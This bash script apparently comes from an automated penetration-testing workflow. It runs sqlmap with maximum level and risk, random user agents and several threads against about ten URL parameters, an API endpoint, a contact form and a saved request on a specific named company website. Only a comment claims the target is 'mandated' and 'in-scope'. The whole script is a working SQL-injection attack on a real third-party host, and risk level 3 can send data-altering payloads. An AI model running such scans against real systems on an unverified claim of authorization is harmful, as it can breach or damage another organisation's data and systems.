#!/bin/bash
# Mandated sqlmap run: every discovered parameter on the in-scope host.
WD="$WORK_PATH"
cd "$WD" || exit 1
mkdir -p tool_outputs/sqlmap_run

IMGP="https://www.infinitycapital.bh/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75"
ROOTQ="https://www.infinitycapital.bh/?id=1&page=2&search=test&zzz=1"
APIC="https://www.infinitycapital.bh/api/?id=1"
CONQ="https://www.infinitycapital.bh/contact?x=1&cb=1&q=1"
FEED="https://www.infinitycapital.bh/atom.xml?q=1"
IMG0="https://www.infinitycapital.bh/_next/image?url=&w=&q="

run () {
  name="$1"; shift
  echo "===== SQLMAP $name ====="
  echo "CMD: $*"
  timeout 420 sqlmap --batch --level=5 --risk=3 --threads=4 --dbms= \
    --random-agent --timeout=15 --retries=1 --output-dir=tool_outputs/sqlmap_run \
    "$@" 2>&1 | grep -viE '^\[|WARNING|CRITICAL.*bypa|^$' | tail -25
  echo "----- result rows -----"
  cat tool_outputs/sqlmap_run/*.csv 2>/dev/null | tail -5
  echo
}

run "image_url_w_q"  -u "$IMGP"
run "image_url_only" -u "$IMGP" -p url
run "image_w"         -u "$IMGP" -p w
run "image_q"         -u "$IMGP" -p q
run "image_empty"     -u "$IMG0"
run "root_query"      -u "$ROOTQ"
run "api_id"          -u "$APIC" -p id
run "contact_query"   -u "$CONQ"
run "atom_query"      -u "$FEED"
run "api_send_form"   -r tool_outputs/sq_send_req.txt
echo "ALL DONE"
